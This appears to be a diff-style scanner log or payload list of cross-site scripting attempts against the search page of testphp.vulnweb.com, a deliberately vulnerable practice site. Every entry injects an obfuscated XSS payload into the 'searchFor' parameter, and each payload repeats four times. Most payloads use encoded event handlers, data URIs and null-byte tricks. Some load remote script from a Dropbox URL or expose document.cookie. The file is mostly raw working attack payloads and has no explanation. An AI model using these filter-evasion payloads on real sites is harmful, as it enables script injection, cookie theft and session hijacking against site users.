+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:http://www.google<script .com>alert(document.location)</script
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:http://www.google<script .com>alert(document.location)</script
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:http://www.google<script .com>alert(document.location)</script
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:http://www.google<script .com>alert(document.location)</script
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img/src=@&#32;&#13; onerror = prompt('&#49;')
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img/src=@&#32;&#13; onerror = prompt('&#49;')
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img/src=@&#32;&#13; onerror = prompt('&#49;')
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img/src=@&#32;&#13; onerror = prompt('&#49;')
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script ^__^>alert(String.fromCharCode(49))</script ^__^
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script ^__^>alert(String.fromCharCode(49))</script ^__^
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script ^__^>alert(String.fromCharCode(49))</script ^__^
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script ^__^>alert(String.fromCharCode(49))</script ^__^
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:&#00;</form><input type&#61;"date" onfocus="alert(1)">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:&#00;</form><input type&#61;"date" onfocus="alert(1)">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:&#00;</form><input type&#61;"date" onfocus="alert(1)">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:&#00;</form><input type&#61;"date" onfocus="alert(1)">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script ~~~>alert(0%0)</script ~~~>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script ~~~>alert(0%0)</script ~~~>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script ~~~>alert(0%0)</script ~~~>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script ~~~>alert(0%0)</script ~~~>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<div/style="width:expression(confirm(1))">X</div> {IE7}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<div/style="width:expression(confirm(1))">X</div> {IE7}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<div/style="width:expression(confirm(1))">X</div> {IE7}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<div/style="width:expression(confirm(1))">X</div> {IE7}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/%00/ src=javaSCRIPT&colon;alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/%00/ src=javaSCRIPT&colon;alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/%00/ src=javaSCRIPT&colon;alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/%00/ src=javaSCRIPT&colon;alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor://<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor://<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor://<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor://<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor://|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor://|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor://|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor://|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</plaintext\></|\><plaintext/onmouseover=prompt(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</plaintext\></|\><plaintext/onmouseover=prompt(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</plaintext\></|\><plaintext/onmouseover=prompt(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</plaintext\></|\><plaintext/onmouseover=prompt(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<var onmouseover="prompt(1)">On Mouse Over</var>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<var onmouseover="prompt(1)">On Mouse Over</var>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<var onmouseover="prompt(1)">On Mouse Over</var>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<var onmouseover="prompt(1)">On Mouse Over</var>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img src="/" =_=" title="onerror='prompt(1)'">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img src="/" =_=" title="onerror='prompt(1)'">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img src="/" =_=" title="onerror='prompt(1)'">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<img src="/" =_=" title="onerror='prompt(1)'">
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<%<!--'%><script>alert(1);</script -->
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<%<!--'%><script>alert(1);</script -->
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<%<!--'%><script>alert(1);</script -->
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<%<!--'%><script>alert(1);</script -->
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script src="data:text/javascript,alert(1)"></script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script src="data:text/javascript,alert(1)"></script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script src="data:text/javascript,alert(1)"></script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<script src="data:text/javascript,alert(1)"></script>
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/src \/\/onload = prompt(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/src \/\/onload = prompt(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/src \/\/onload = prompt(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/src \/\/onload = prompt(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/onreadystatechange=alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/onreadystatechange=alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/onreadystatechange=alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<iframe/onreadystatechange=alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<svg/onload=alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<svg/onload=alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
